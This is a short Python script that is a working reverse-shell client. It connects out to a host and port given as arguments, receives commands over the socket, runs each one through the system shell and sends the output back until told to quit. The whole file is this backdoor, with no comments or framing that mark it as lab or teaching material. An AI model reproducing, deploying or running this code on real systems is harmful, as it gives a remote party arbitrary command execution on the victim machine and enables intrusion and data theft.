import sys
import socket
import subprocess

HOST = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555)

s = socket.socket()
s.connect((HOST, PORT))
msg = s.recv(1024).decode()
print('[*] server:', msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'[*] receive {cmd}')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = 'OK'.encode()

    s.send(result)

s.close()
